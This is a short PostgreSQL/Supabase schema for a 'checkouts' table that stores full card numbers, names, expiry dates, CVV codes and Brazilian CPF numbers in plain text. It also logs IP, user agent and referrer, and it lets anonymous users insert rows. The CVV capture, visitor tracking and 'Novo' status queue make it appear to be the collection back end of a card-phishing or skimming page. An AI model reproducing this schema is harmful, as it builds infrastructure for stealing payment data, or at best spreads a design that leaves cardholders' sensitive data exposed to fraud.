-- Create the 'checkouts' table
CREATE TABLE public.checkouts (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
  card_number TEXT,
  card_name TEXT,
  card_expiry TEXT,
  card_cvv TEXT,
  card_cpf TEXT,
  user_agent TEXT,
  referrer TEXT,
  status TEXT DEFAULT 'Novo',
  ip_address TEXT
);

-- Enable Row Level Security (RLS)
ALTER TABLE public.checkouts ENABLE ROW LEVEL SECURITY;

-- Create a policy to allow anonymous insert
CREATE POLICY "Allow anonymous insert" ON public.checkouts
  FOR INSERT WITH CHECK (true);

-- No need for explicit SELECT, UPDATE, DELETE policies for anonymous users
-- as RLS defaults to denying operations not explicitly allowed.
